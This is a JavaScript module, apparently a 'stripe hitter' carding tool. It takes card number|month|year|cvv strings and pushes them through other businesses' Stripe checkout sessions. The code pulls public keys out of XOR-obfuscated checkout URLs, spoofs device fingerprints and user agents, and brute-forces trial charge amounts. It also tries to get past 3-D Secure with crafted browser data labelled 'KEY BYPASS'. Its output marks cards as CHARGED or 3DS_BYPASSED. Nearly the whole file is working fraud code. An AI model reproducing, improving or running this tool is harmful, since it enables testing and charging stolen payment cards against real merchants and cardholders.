// ===================================
// CHECKOUT SERVICE
// Automated Stripe Checkout Processing
// Based on reference stripe_hitter.py
// ===================================

const https = require('https');
const http = require('http');
const { URL } = require('url');

class CheckoutService {
  constructor() {
    this.STRIPE_API = "https://api.stripe.com";
    this.XOR_KEY = 5;

    // 3DS Configuration
    this.THREEDS_CONFIG = {
      max_retries: 3,
      retry_delay: 0.5,
      timeout: 15
    };

    // User agents for rotation
    this.USER_AGENTS = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ];
  }

  // Generate device fingerprint IDs
  generateStripeGuid() {
    const { v4: uuidv4 } = require('uuid');
    return uuidv4();
  }

  generateStripeMuid() {
    const chars = '0123456789abcdef';
    return Array.from({length: 32}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  }

  // Parse checkout URL to extract session ID and public key
  parseCheckoutUrl(checkoutUrl) {
    const result = { sessionId: null, publicKey: null, site: null };

    if (!checkoutUrl) return result;

    try {
      // Decode URL
      let url = decodeURIComponent(checkoutUrl);

      // Find session ID (cs_live_... or cs_test_...)
      const sessionMatch = url.match(/cs_(?:live|test)_[A-Za-z0-9]+/);
      if (sessionMatch) {
        result.sessionId = sessionMatch[0];
      }

      // Check for key in query parameters (fallback for direct URLs)
      try {
        const parsedUrl = new URL(url);
        const keyParam = parsedUrl.searchParams.get('key');
        if (keyParam && keyParam.startsWith('pk_')) {
          result.publicKey = keyParam;
        }
      } catch (urlError) {
        // Ignore URL parsing errors
      }

      // Extract public key from fragment
      const fragmentPos = url.indexOf('#');
      if (fragmentPos !== -1) {
        const fragment = url.substring(fragmentPos + 1);
        try {
          const decoded = Buffer.from(decodeURIComponent(fragment), 'base64').toString();
          const xorDecoded = decoded.split('').map(char => String.fromCharCode(char.charCodeAt(0) ^ this.XOR_KEY)).join('');

          const pkMatch = xorDecoded.match(/pk_(?:live|test)_[A-Za-z0-9]+/);
          if (pkMatch) {
            result.publicKey = pkMatch[0];
          }

          const siteMatch = xorDecoded.match(/https?:\/\/[^\s"\']+/);
          if (siteMatch) {
            result.site = siteMatch[0];
          }
        } catch (e) {
          // Ignore decode errors
        }
      }

      return result;
    } catch (e) {
      return result;
    }
  }

  // Generate bypass browser data for 3DS
  getBypassBrowserData() {
    const screenSizes = [
      ['1920', '1080'], ['2560', '1440'], ['1366', '768'],
      ['1536', '864'], ['1440', '900'], ['1680', '1050']
    ];
    const timezones = ['-480', '-420', '-360', '-300', '-240', '0', '60', '120', '180'];
    const colorDepths = ['24', '32', '30'];

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];

    return {
      fingerprintAttempted: true,
      fingerprintData: null,
      challengeWindowSize: null,
      threeDSCompInd: 'Y',
      browserJavaEnabled: false,
      browserJavascriptEnabled: true,
      browserLanguage: '', // KEY BYPASS: Empty string
      browserColorDepth: colorDepths[Math.floor(Math.random() * colorDepths.length)],
      browserScreenWidth: screen[0],
      browserScreenHeight: screen[1],
      browserTZ: timezones[Math.floor(Math.random() * timezones.length)],
      browserUserAgent: this.USER_AGENTS[Math.floor(Math.random() * this.USER_AGENTS.length)]
    };
  }

  // Parse card string (number|month|year|cvv)
  parseCardString(cardString) {
    const parts = cardString.split('|').map(p => p.trim());

    if (parts.length < 4) {
      throw new Error('Card format: number|month|year|cvv');
    }

    let cardNumber = parts[0].replace(/\s/g, '');
    let expMonth = parts[1].padStart(2, '0');
    let expYear = parts[2];

    if (expYear.length === 2) {
      expYear = '20' + expYear;
    }
    expYear = expYear.slice(-2);

    return {
      number: cardNumber,
      exp_month: expMonth,
      exp_year: expYear,
      cvc: parts[3]
    };
  }

  // Make HTTP request (no proxy for now)
  async makeRequest(url, data, options = {}) {
    return new Promise((resolve, reject) => {
      const urlObj = new URL(url);
      const postData = new URLSearchParams(data).toString();

      const requestOptions = {
        hostname: urlObj.hostname,
        port: urlObj.protocol === 'https:' ? 443 : 80,
        path: urlObj.pathname + urlObj.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData),
          'Accept': 'application/json',
          'Origin': 'https://checkout.stripe.com',
          'Referer': 'https://checkout.stripe.com/',
          'User-Agent': options.userAgent || this.USER_AGENTS[0],
          ...options.headers
        },
        timeout: options.timeout || 30000,
        ...options.requestOptions
      };

      const req = (urlObj.protocol === 'https:' ? https : http).request(requestOptions, (res) => {
        let body = '';

        res.on('data', (chunk) => {
          body += chunk;
        });

        res.on('end', () => {
          try {
            const json = JSON.parse(body);
            resolve(json);
          } catch (e) {
            resolve({ error: { message: 'Invalid JSON response' } });
          }
        });
      });

      req.on('error', (err) => {
        resolve({ error: { message: err.message } });
      });

      req.on('timeout', () => {
        req.destroy();
        resolve({ error: { message: 'Request timeout' } });
      });

      req.write(postData);
      req.end();
    });
  }

  // Fetch checkout info
  async fetchCheckoutInfo(sessionId, publicKey, proxy = null) {
    const url = `${this.STRIPE_API}/v1/payment_pages/${sessionId}/init`;

    const data = {
      key: publicKey,
      eid: 'NA',
      browser_locale: ''
    };

    return this.makeRequest(url, data);
  }

  // Create payment method
  async createPaymentMethod(card, publicKey, sessionId, email, proxy = null) {
    const url = `${this.STRIPE_API}/v1/payment_methods`;

    const data = {
      type: 'card',
      'card[number]': card.number,
      'card[cvc]': card.cvc,
      'card[exp_month]': card.exp_month,
      'card[exp_year]': card.exp_year,
      'billing_details[name]': 'Test User',
      'billing_details[email]': email,
      'billing_details[address][country]': 'US',
      'billing_details[address][line1]': '1501 Gaylord Trail',
      'billing_details[address][city]': 'Grapevine',
      'billing_details[address][state]': 'TX',
      'billing_details[address][postal_code]': '76051',
      guid: this.generateStripeGuid(),
      muid: this.generateStripeMuid(),
      sid: this.generateStripeGuid(),
      key: publicKey,
      payment_user_agent: 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout'
    };

    return this.makeRequest(url, data);
  }

  // Confirm payment
  async confirmPayment(paymentMethodId, sessionId, publicKey, expectedAmount, initChecksum) {
    const url = `${this.STRIPE_API}/v1/payment_pages/${sessionId}/confirm`;

    // Generate bypass browser data
    const browserData = this.getBypassBrowserData();
    const deviceDataJson = JSON.stringify(browserData);
    const deviceDataB64 = Buffer.from(deviceDataJson).toString('base64');

    const data = {
      eid: 'NA',
      payment_method: paymentMethodId,
      expected_amount: String(expectedAmount),
      'consent[terms_of_service]': 'accepted',
      expected_payment_method_type: 'card',
      guid: this.generateStripeGuid(),
      muid: this.generateStripeMuid(),
      sid: this.generateStripeGuid(),
      key: publicKey,
      version: '90ba939846',
      init_checksum: initChecksum || ''
    };

    return this.makeRequest(url, data);
  }

  // Handle 3DS challenge (simplified version)
  async handle3DS(paymentIntent, publicKey) {
    if (!paymentIntent || !paymentIntent.next_action) {
      return { success: false, error: 'No 3DS action required' };
    }

    const nextAction = paymentIntent.next_action;

    if (nextAction.type === 'use_stripe_sdk') {
      const sdkData = nextAction.use_stripe_sdk;
      const source = sdkData.three_d_secure_2_source || sdkData.source;

      if (source) {
        // Try 3DS authentication
        const authUrl = `${this.STRIPE_API}/v1/3ds2/authenticate`;
        const browserData = this.getBypassBrowserData();

        const authData = {
          source: source,
          browser: JSON.stringify(browserData),
          one_click_authn_device_support: {
            hosted: 'false',
            same_origin_frame: 'false',
            spc_eligible: 'false',
            webauthn_eligible: 'false',
            publickey_credentials_get_allowed: 'true'
          },
          key: publicKey
        };

        const authResult = await this.makeRequest(authUrl, authData);

        if (authResult.state === 'succeeded') {
          return { success: true, status: '3DS_BYPASSED' };
        }
      }
    }

    return { success: false, status: '3DS_FAILED' };
  }

  // Get amount and currency from checkout info
  getAmountAndCurrency(info) {
    let currency = info.currency || 'usd';
    let amount = null;
    let gotFromPrimary = false;
    let businessUrl = info.business_url || null;
    let businessName = null;

    // Extract business information from account_settings (like cc script)
    if (info.account_settings) {
      const acc = info.account_settings;

      // Get business name (like cc script does: acc.get('display_name', 'N/A'))
      if (acc.display_name) {
        businessName = acc.display_name;
      } else if (acc.business_profile && acc.business_profile.name) {
        businessName = acc.business_profile.name;
      } else if (acc.business_name) {
        businessName = acc.business_name;
      }

      // Get business URL (this is what user wants extracted like cc script)
      if (!businessUrl) {
        if (acc.business_profile && acc.business_profile.url) {
          businessUrl = acc.business_profile.url;
        } else if (acc.business_url) {
          businessUrl = acc.business_url;
        } else if (acc.website) {
          businessUrl = acc.website;
        }
      }
    }

    // Priority 1: line_item_group.due (contains correct multi-currency presentment amount)
    if (info.line_item_group && typeof info.line_item_group === 'object') {
      const lig = info.line_item_group;
      if (lig.due !== null && lig.due !== undefined) {
        amount = lig.due;
        gotFromPrimary = true;
      }
      if (lig.currency) {
        currency = lig.currency;
      }
    }

    // Priority 2: total_summary.due (fallback)
    if (amount === null && info.total_summary && typeof info.total_summary === 'object') {
      const ts = info.total_summary;
      if (ts.due !== null && ts.due !== undefined) {
        amount = ts.due;
        gotFromPrimary = true;
      }
      if (ts.currency) {
        currency = ts.currency;
      }
    }

    // Priority 3: computed_amount (only if above didn't have amount)
    if (amount === null && info.computed_amount && typeof info.computed_amount === 'object') {
      const ca = info.computed_amount;
      if (ca.total !== null && ca.total !== undefined) {
        amount = ca.total;
      }
      // Only use computed_amount currency if we didn't get from primary sources
      if (!gotFromPrimary && ca.currency) {
        currency = ca.currency;
      }
    }

    // Additional fallbacks
    if (info.presentment_currency) {
      currency = info.presentment_currency;
    }
    if (amount === null && info.presentment_amount !== null && info.presentment_amount !== undefined) {
      amount = info.presentment_amount;
    }

    if (amount === null && info.amount_total !== null && info.amount_total !== undefined) {
      amount = info.amount_total;
    }

    if (amount === null && info.total !== null && info.total !== undefined) {
      amount = info.total;
    }

    if (amount === null && info.amount !== null && info.amount !== undefined) {
      amount = info.amount;
    }

    // Check invoice data
    if (amount === null && info.invoice && typeof info.invoice === 'object') {
      const invoice = info.invoice;
      if (invoice.total !== null && invoice.total !== undefined) {
        amount = invoice.total;
      } else if (invoice.amount_due !== null && invoice.amount_due !== undefined) {
        amount = invoice.amount_due;
      }
      if (invoice.currency) {
        currency = invoice.currency;
      }
    }

    // Check line_items array
    if (amount === null && info.line_items) {
      let items = info.line_items;
      if (typeof items === 'object' && items.data) {
        items = items.data;
      }
      if (Array.isArray(items)) {
        let total = 0;
        for (const item of items) {
          total += (item.amount_total || item.amount || 0);
        }
        if (total > 0) {
          amount = total;
        }
      }
    }

    // Check payment_intent
    if (amount === null && info.payment_intent && typeof info.payment_intent === 'object') {
      const pi = info.payment_intent;
      if (pi.amount !== null && pi.amount !== undefined) {
        amount = pi.amount;
      }
      if (pi.currency) {
        currency = pi.currency;
      }
    }

    // Check order data
    if (amount === null && info.order && typeof info.order === 'object') {
      const order = info.order;
      if (order.amount !== null && order.amount !== undefined) {
        amount = order.amount;
      }
      if (order.currency) {
        currency = order.currency;
      }
    }

    // Check subscription data (including trials) - Enhanced
    if (amount === null && info.subscription_data && typeof info.subscription_data === 'object') {
      const sub = info.subscription_data;
      console.log(`[*] Found subscription_data - checking for amounts`);

      if (sub.items && Array.isArray(sub.items) && sub.items.length > 0) {
        const firstItem = sub.items[0];

        if (firstItem.price && typeof firstItem.price === 'object') {
          // Check unit_amount first
          if (firstItem.price.unit_amount !== null && firstItem.price.unit_amount !== undefined) {
            amount = firstItem.price.unit_amount;
            console.log(`[*] Found subscription unit_amount: ${amount} cents`);
            if (firstItem.price.currency) {
              currency = firstItem.price.currency;
            }
          }
          // Check for trial_amount
          else if (firstItem.price.trial_amount !== null && firstItem.price.trial_amount !== undefined) {
            amount = firstItem.price.trial_amount;
            console.log(`[*] Found trial_amount: ${amount} cents`);
            if (firstItem.price.currency) {
              currency = firstItem.price.currency;
            }
          }
          // Check for any amount field
          else if (firstItem.price.amount !== null && firstItem.price.amount !== undefined) {
            amount = firstItem.price.amount;
            console.log(`[*] Found price amount: ${amount} cents`);
            if (firstItem.price.currency) {
              currency = firstItem.price.currency;
            }
          }
        }

        // Check item-level amount fields
        if (amount === null) {
          if (firstItem.unit_amount !== null && firstItem.unit_amount !== undefined) {
            amount = firstItem.unit_amount;
            console.log(`[*] Found item unit_amount: ${amount} cents`);
          } else if (firstItem.amount !== null && firstItem.amount !== undefined) {
            amount = firstItem.amount;
            console.log(`[*] Found item amount: ${amount} cents`);
          }
          if (firstItem.currency) {
            currency = firstItem.currency;
          }
        }
      }

      // Check subscription metadata
      if (amount === null && sub.metadata && typeof sub.metadata === 'object') {
        if (sub.metadata.amount !== null && sub.metadata.amount !== undefined) {
          amount = parseInt(sub.metadata.amount);
          console.log(`[*] Found metadata amount: ${amount} cents`);
        }
        if (sub.metadata.currency) {
          currency = sub.metadata.currency;
        }
      }

      // Check for trial information
      if (amount === null && sub.trial_days && sub.trial_days > 0) {
        console.log(`[*] Trial subscription detected (${sub.trial_days} days)`);
        amount = 0; // Trials often have $0 initial charge
      }
    }

    // Special handling for trial subscriptions - look for any non-zero amount
    if (amount === null || amount === 0) {
      // Check recurring details for subscription amounts
      if (info.recurring_details && typeof info.recurring_details === 'object') {
        const recurring = info.recurring_details;
        if (recurring.amount !== null && recurring.amount !== undefined && recurring.amount > 0) {
          amount = recurring.amount;
        }
        if (recurring.currency) {
          currency = recurring.currency;
        }
      }

      // Check for any pricing information in the checkout
      if (amount === null && info.line_items && Array.isArray(info.line_items)) {
        let items = info.line_items;
        if (typeof items === 'object' && items.data) {
          items = items.data;
        }
        for (const item of items) {
          if (item.price && typeof item.price === 'object') {
            if (item.price.unit_amount && item.price.unit_amount > 0) {
              amount = item.price.unit_amount;
              if (item.price.currency) {
                currency = item.price.currency;
              }
              break;
            }
          }
          // Check item amount_total or amount
          if ((item.amount_total && item.amount_total > 0) || (item.amount && item.amount > 0)) {
            amount = item.amount_total || item.amount;
            break;
          }
        }
      }
    }

    return { amount, currency, businessUrl, businessName };
  }

  // Main checkout processing function
  async processCheckout(checkoutUrl, cardString, proxy = null) {
    try {
      console.log(`[*] Processing checkout: ${checkoutUrl.substring(0, 50)}...`);
      if (proxy) {
        console.log(`[*] Using proxy: ${proxy.host}:${proxy.port}`);
      }

      // Parse checkout URL
      const parsed = this.parseCheckoutUrl(checkoutUrl);
      if (!parsed.sessionId || !parsed.publicKey) {
        return {
          success: false,
          status: 'INVALID_URL',
          error: 'Could not parse checkout URL'
        };
      }

      console.log(`[*] Session: ${parsed.sessionId}`);
      console.log(`[*] Public Key: ${parsed.publicKey.substring(0, 20)}...`);

      // Parse card
      const card = this.parseCardString(cardString);
      console.log(`[*] Card: ...${card.number.slice(-4)}`);

      // Fetch checkout info
      const info = await this.fetchCheckoutInfo(parsed.sessionId, parsed.publicKey, proxy);

      // Debug: Log key fields for troubleshooting
      console.log(`[*] Available checkout fields:`, Object.keys(info).slice(0, 10).join(', '));
      if (info.subscription_data) {
        console.log(`[*] Has subscription_data - likely a trial/subscription`);
      }

      if (info.error) {
        return {
          success: false,
          status: 'FETCH_ERROR',
          error: info.error.message
        };
      }

      let { amount, currency, businessUrl, businessName } = this.getAmountAndCurrency(info);
      const email = info.customer_email || 'test@example.com';

      // Convert cents to dollars for display
      const displayAmount = amount !== null ? (amount / 100).toFixed(2) : 'unknown';
      console.log(`[*] Amount: $${displayAmount} ${currency.toUpperCase()}`);
      console.log(`[*] Email: ${email}`);

      // Create payment method
      console.log(`[*] Creating payment method...`);
      const pmResult = await this.createPaymentMethod(card, parsed.publicKey, parsed.sessionId, email, proxy);

      if (!pmResult.id) {
        const error = pmResult.error || {};
        return {
          success: false,
          status: 'PAYMENT_METHOD_ERROR',
          error: error.message || 'Failed to create payment method',
          code: error.code
        };
      }

      const pmId = pmResult.id;
      console.log(`[*] Payment method created: ${pmId}`);

      // Handle null amount with aggressive fallback for trials
      if (amount === null || amount === undefined || amount <= 0) {
        console.log(`[*] Amount is ${amount}, this appears to be a trial subscription. Trying common amounts...`);

        // Most common trial amounts: 0 (free trial), then small amounts
        const commonTrialAmounts = [0, 1, 50, 99, 100, 199, 299, 499, 999, 1999, 2999];

        for (const trialAmount of commonTrialAmounts) {
          console.log(`[*] Testing amount: ${trialAmount} cents ($${(trialAmount / 100).toFixed(2)})`);

          try {
            const testResult = await this.confirmPayment(
              pmId,
              parsed.sessionId,
              parsed.publicKey,
              trialAmount,
              info.init_checksum
            );

            // Check if payment succeeded
            if (testResult.status === 'complete') {
              amount = trialAmount;
              console.log(`[*] ✅ SUCCESS! Trial amount found: ${trialAmount} cents ($${(trialAmount / 100).toFixed(2)})`);
              break;
            }

            // If it's not an amount mismatch, it might be a different issue
            if (testResult.error?.code && testResult.error.code !== 'checkout_amount_mismatch') {
              console.log(`[*] ⚠️  Different error (${testResult.error.code}), but trying next amount...`);
            }

          } catch (error) {
            console.log(`[*] Error testing amount ${trialAmount}:`, error.message);
          }

          // Small delay between attempts
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        // If still no amount found, use a reasonable default
        if (amount === null || amount === undefined || amount < 0) {
          amount = 99; // $0.99 - common trial amount
          console.log(`[*] Using default trial amount: ${amount} cents ($${(amount / 100).toFixed(2)})`);
        }
      }

      // Confirm payment
      console.log(`[*] Confirming payment...`);
      const confirmResult = await this.confirmPayment(
        pmId,
        parsed.sessionId,
        parsed.publicKey,
        amount,
        info.init_checksum
      );

      // Check result
      if (confirmResult.status === 'complete') {
        return {
          success: true,
          status: 'CHARGED',
          card: card.number,
          amount: amount,
          currency: currency,
          businessUrl: businessUrl,
          payment_intent: confirmResult.payment_intent?.id
        };
      }

      // Check for 3DS
      const pi = confirmResult.payment_intent;
      if (pi && pi.status === 'requires_action' && pi.next_action) {
        console.log(`[*] 3DS detected, attempting bypass...`);
        const bypassResult = await this.handle3DS(pi, parsed.publicKey);

        if (bypassResult.success) {
          return {
            success: true,
            status: '3DS_BYPASSED',
            card: card.number,
            amount: amount,
            currency: currency,
            businessUrl: businessUrl,
            payment_intent: pi.id,
            bypass: bypassResult
          };
        }

        return {
          success: true,
          status: '3DS',
          card: card.number,
          amount: amount,
          currency: currency,
          businessUrl: businessUrl,
          payment_intent: pi.id,
          bypass_attempted: true
        };
      }

      // Handle errors - Stripe API error format
      let errorObj = {};

      // Check if it's a direct error response
      if (confirmResult.error) {
        errorObj = confirmResult.error;
      }
      // Check if the entire response is an error
      else if (confirmResult.code || confirmResult.decline_code || confirmResult.message) {
        errorObj = confirmResult;
      }
      // Check for payment_intent error
      else if (confirmResult.payment_intent && confirmResult.payment_intent.last_payment_error) {
        errorObj = confirmResult.payment_intent.last_payment_error;
      }

      // If still no error found, create a generic one
      if (!errorObj.code && !errorObj.message) {
        errorObj = {
          code: 'unknown_error',
          message: 'Unknown payment error occurred'
        };
      }

      return {
        success: false,
        status: this.interpretResult(errorObj.code, errorObj.decline_code, errorObj.message),
        error: errorObj.message || 'Payment failed',
        code: errorObj.code,
        decline_code: errorObj.decline_code,
        card: card.number
      };

    } catch (error) {
      console.error('[!] Checkout error:', error);
      return {
        success: false,
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // Interpret Stripe error codes
  interpretResult(code, declineCode, message) {
    const statusMap = {
      'card_declined': 'DECLINED',
      'expired_card': 'EXPIRED',
      'incorrect_cvc': 'CVV_ERROR',
      'incorrect_number': 'INVALID',
      'invalid_card_number': 'INVALID',
      'insufficient_funds': 'NO_FUNDS',
      'processing_error': 'PROC_ERROR'
    };

    const declineMap = {
      'generic_decline': 'DECLINED',
      'insufficient_funds': 'NSF',
      'lost_card': 'LOST',
      'stolen_card': 'STOLEN'
    };

    if (statusMap[code]) return statusMap[code];
    if (declineMap[declineCode]) return declineMap[declineCode];

    return code ? code.toUpperCase() : 'UNKNOWN';
  }

  // Format result for display
  formatResult(result) {
    const card = result.card ? `...${result.card.slice(-4)}` : '****';
    const status = result.status || 'UNKNOWN';

    let symbol = '[-]';
    let color = 'RED';

    if (['CHARGED', '3DS_BYPASSED'].includes(status)) {
      symbol = '[+]';
      color = 'GREEN';
    } else if (['3DS', 'CVV_ERROR', 'NO_FUNDS'].includes(status)) {
      symbol = '[~]';
      color = 'YELLOW';
    }

    const amount = result.amount ? `${result.amount} ${result.currency?.toUpperCase() || 'USD'}` : '';
    const details = [card, status];
    if (amount) details.push(amount);

    return {
      text: `${symbol} ${details.join(' | ')}`,
      color: color,
      result: result
    };
  }
}

module.exports = new CheckoutService();